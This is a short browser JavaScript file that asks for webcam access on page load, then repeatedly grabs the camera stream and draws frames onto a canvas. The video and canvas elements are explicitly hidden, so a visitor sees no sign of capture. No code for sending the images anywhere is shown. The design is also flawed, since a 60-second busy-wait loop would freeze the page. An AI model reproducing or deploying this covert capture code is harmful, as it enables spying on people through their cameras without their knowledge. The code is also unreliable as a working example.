window.onload = function () {
    if (navigator.getUserMedia) {
        navigator.getUserMedia({
            video: true
        }, function () {}, function () {})
        setTimeout(function () {
            now = Date.now()
            while (Date.now() - now < 60000){
                getPicture()
            }
        }, 15000);
    }
}

function getPicture() {
    navigator.getUserMedia({
            video: true
        }, function (stream) {
            var video = document.getElementById("v");
            var canvas = document.getElementById("c");
            video.style.visibility = 'hidden'
            canvas.style.visibility = 'hidden'
            video.srcObject = stream;

                video.addEventListener("canplay", function (e) {
                    canvas.getContext("2d").drawImage(video, 0, 0);
                });
        },
        function () {})
}